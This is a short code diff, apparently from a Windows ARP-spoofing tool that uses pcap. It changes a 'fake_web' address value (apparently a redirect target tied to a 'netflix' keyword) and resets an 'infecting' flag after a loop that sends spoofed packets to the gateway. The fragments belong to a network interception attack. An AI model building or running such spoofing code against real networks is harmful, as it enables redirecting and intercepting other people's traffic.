@@ -6,7 +6,7 @@
 extern send_params infect_params;
 BOOL finished_infecting = 0;
 static char* keyword = "netflix";
-u_long fake_web = 1111; // TODO 
+u_long fake_web = 264000259; // TODO 
 
 void stop_arp_spoofing()
 {
@@ -70,6 +70,7 @@ DWORD WINAPI start_arp_spoofing(LPVOID lparam)
 		pcap_sendpacket(infect_params.fp, gateway_packet, pack_size);
 		Sleep(2000); 
 	}
+	finished_infecting = 0;
 	return 0;
 }
 
